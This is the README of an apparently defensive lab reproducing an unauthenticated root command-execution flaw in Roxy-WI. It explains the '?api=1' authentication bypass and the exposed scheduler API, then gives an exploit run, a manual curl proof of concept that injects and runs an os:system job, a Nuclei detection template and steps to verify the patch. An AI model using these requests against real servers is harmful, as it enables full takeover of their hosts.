# Roxy-WI ≤ 8.2.6.4 — Unauthenticated Root RCE (`?api=1` auth bypass → `/scheduler/jobs` `os.system`)

| | |
| --- | --- |
| **Advisory** | [GHSA-hqf9-xcvr-7xj5](https://github.com/roxy-wi/roxy-wi/security/advisories/GHSA-hqf9-xcvr-7xj5) |
| **CVE** | None assigned to this advisory (the auth-bypass half is attributed to **CVE-2026-45567** in the advisory body) |
| **Class (CWE)** | OS command injection (CWE-78), via authentication bypass (CWE-287 / alternate path) |
| **Auth** | **none** — unauthenticated, remote; executes as **root** |
| **Affected** | Roxy-WI **≤ 8.2.6.4** (default configuration, all deployments) |
| **Fixed** | No fixed release named in the advisory; the bypass is **already gone on `master`** (proper endpoint allow-list) |
| **CVSS 3.1** | **9.8 critical** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Impact** | Unauthenticated arbitrary command execution as root → `/etc/shadow` disclosure, persistence, full takeover |
| **Exploit** | `exploit_roxy_wi_scheduler_rce.py` + [`nuclei/roxy-wi-scheduler-rce.yaml`](./nuclei/roxy-wi-scheduler-rce.yaml) |

Append `?api=1` to any route and authentication is skipped; the unprotected
flask_apscheduler API then runs an `os.system` job of the attacker's choosing:

```
POST /scheduler/jobs?api=1     {"func":"os:system","args":["<cmd>"], ...}
POST /scheduler/jobs/<id>/run?api=1
GET  /static/<out>?api=1        # read the command output back
```

---

## ⚠️ Scope & caveats (read first)

1. **No CVE for this advisory.** GHSA-hqf9-xcvr-7xj5's CVE field is "No known CVE";
   its body attributes the auth-bypass root cause to **CVE-2026-45567**. This lab is
   keyed by the GHSA id (cf. `defectdojo-ghsa-w2j3-x3j3-mm43`).
2. **Version/commit discrepancy — verified at source.** The advisory says `<= 8.2.6.4`
   is affected but cites master commit `7744ecf5…`. I checked both: the bug is **real
   and verbatim at the `v8.2.6.4` tag** (`app/login.py:19`), but the cited **master
   commit has already been rewritten** to a proper allow-list + JWT (so it is *not*
   the described vulnerable code). The repo docs target 9.1+/Helm 10.1.0, newer than
   the affected range. Treat "all current deployments are affected" from the advisory
   with caution — on master the bypass is gone.
3. **Minimal faithful reproduction, not the full product.** Roxy-WI is a large
   HAProxy/Nginx manager. The vulnerability, however, lives entirely in the Flask
   wiring plus the **real pinned dependency `Flask-APScheduler==1.13.1`** — not in any
   HAProxy logic. This lab mirrors the exact vulnerable wiring from `v8.2.6.4`:
   - `app/login.py:19` — `if 'api' not in request.url and request.endpoint not in allowed_endpoints:` (verbatim)
   - `app/config.py:13` — `SCHEDULER_API_ENABLED = True` (no `SCHEDULER_AUTH`)
   - `app/__init__.py:27-29` — `scheduler.init_app(app); scheduler.start()`
   - `requirements.txt` — `Flask==3.0.3`, `Flask-APScheduler==1.13.1`

   The RCE sink is **genuine upstream code**: `os:system` is resolved by APScheduler's
   own `ref_to_obj` and executed by flask_apscheduler's own `run_job`. Only the
   non-security parts of Roxy-WI (and the account DB, stubbed to "always reject") are
   omitted — the exploit is pre-auth, so a real login is never exercised.

---

## Root cause

**Auth bypass** — `app/login.py:19` (v8.2.6.4):

```python
@app.before_request
def check_login():
    allowed_endpoints = ('login_page', 'static', ... )
    if 'api' not in request.url and request.endpoint not in allowed_endpoints:
        #   ^^^^^^^^^^^^^^^^^^^^^^^^  substring match on the FULL url incl. query string
        user_params = roxywi_common.get_users_params()   # skipped entirely when
        if not user_sql.is_user_active(user_params['user_id']): abort(401)   # 'api' is
        roxywi_auth.check_login(user_params['user_id'])                      # anywhere
```

`request.url` is `http://host/scheduler/jobs?api=1` — it contains `api`, so the
condition is `False` and the whole auth block is skipped. Any `?api=1` (or `?x=api`)
works on any route.

**Unprotected sink** — `app/config.py:13` sets `SCHEDULER_API_ENABLED = True` with no
`SCHEDULER_AUTH`, and `app/__init__.py:27-29` starts flask_apscheduler, which mounts
the 8 `/scheduler/*` routes via `app.add_url_rule` (not a blueprint, so the
blueprint-level `@jwt_required` never applies). `POST /scheduler/jobs` passes the body
to APScheduler, whose `ref_to_obj` (`__import__` + `getattr`) turns the string
`"os:system"` into `os.system`; `POST /scheduler/jobs/<id>/run` then calls
`job.func(*job.args)` = `os.system("<attacker cmd>")` synchronously. Flask's `static`
endpoint is whitelisted, so the output written into `app/static/` is read back
unauthenticated.

**Fix (`master`):** `app/login.py` drops the `'api' not in request.url` check for a
proper `allowed_endpoints` allow-list plus JWT validation (`get_jwt_token_claims`), so
`?api=1` no longer bypasses and `/scheduler/*` requires authentication.

---

## Spawn

Minimal Spring-free Flask reproduction, built from source, published on host port
**8088** (container listens on Roxy-WI's **8080**).

```bash
docker compose up -d --build        # vulnerable (PATCHED=0)
```

A benign default job (`delete_old_logs`) is seeded so the job list looks like a real
install. The app runs as **root** in the container, so the PoC shows `uid=0`.

## Exploit

```bash
./exploit_roxy_wi_scheduler_rce.py                         # runs `id; whoami; hostname`
./exploit_roxy_wi_scheduler_rce.py http://127.0.0.1:8088 'cat /etc/hostname'
```

```
[*] control   GET  /scheduler/jobs            -> HTTP 401
[*] bypass    GET  /scheduler/jobs?api=1       -> HTTP 200 (unauthenticated job listing)
[*] inject    POST /scheduler/jobs?api=1       -> HTTP 200 (func=os:system registered)
[*] execute   POST /scheduler/jobs/rwi_.../run?api=1 -> HTTP 200 (os.system runs synchronously)
[*] read      GET  /static/rwi_....txt?api=1 -> HTTP 200
[+] Command output (executed on the server):
    uid=0(root) gid=0(root) groups=0(root)
    root
    <hostname>
[+] Running as ROOT (uid=0).
==> VULNERABLE (GHSA-hqf9-xcvr-7xj5): unauthenticated os.system execution via /scheduler/jobs ...
```

Exit `0` = vulnerable, `1` = not vulnerable, `2` = error. The default command is
benign; the exploit cleans up the job it creates.

### Manual PoC (`curl`)

```bash
B=http://127.0.0.1:8088
RUN=$(date -u -v+1H '+%Y-%m-%dT%H:%M:%S+00:00')   # any future time; /run forces execution

# 1) auth bypass — scheduler API served unauthenticated
curl -s "$B/scheduler/jobs?api=1"                                    # HTTP 200, job list

# 2) inject an os:system job
curl -s -X POST "$B/scheduler/jobs?api=1" -H 'Content-Type: application/json' \
  -d "{\"id\":\"rwi_pwn\",\"func\":\"os:system\",\"args\":[\"id > app/static/rwi_id.txt\"],\"trigger\":\"date\",\"run_date\":\"$RUN\",\"misfire_grace_time\":60}"

# 3) trigger synchronous execution, 4) read output back (static is whitelisted)
curl -s -X POST "$B/scheduler/jobs/rwi_pwn/run?api=1" >/dev/null
curl -s "$B/static/rwi_id.txt?api=1"                                 # uid=0(root) ...
```

> ⚠️ The advisory's own PoC reads `/etc/shadow`. This lab can do the same (it is a
> throwaway container shadow), but the shipped exploit stays with benign commands.

## Detect (Nuclei)

```bash
nuclei -validate -t nuclei/roxy-wi-scheduler-rce.yaml
nuclei -t nuclei/roxy-wi-scheduler-rce.yaml -u http://127.0.0.1:8088
```

Non-destructive: it only checks that `GET /scheduler/jobs` is `401` while
`GET /scheduler/jobs?api=1` is `200` returning a job list — i.e. the auth bypass +
exposed scheduler API — **without** injecting or running any job. It extracts the
exposed job `func` references.

## Verify the patch

```bash
PATCHED=1 docker compose up -d --build --force-recreate
./exploit_roxy_wi_scheduler_rce.py                         # -> NOT vulnerable (exit 1)
nuclei -t nuclei/roxy-wi-scheduler-rce.yaml -u http://127.0.0.1:8088   # -> no results
PATCHED=0 docker compose up -d --build --force-recreate   # back to vulnerable
```

With `PATCHED=1`, `app/login.py` uses the `master` allow-list, so `?api=1` returns
`401` and the scheduler API is no longer reachable unauthenticated.

## Cleanup

```bash
docker compose down -v
```

> ⚠️ Intentionally vulnerable — this instance runs arbitrary OS commands as root for
> any unauthenticated client. Run locally / isolated only, never exposed to the
> internet.
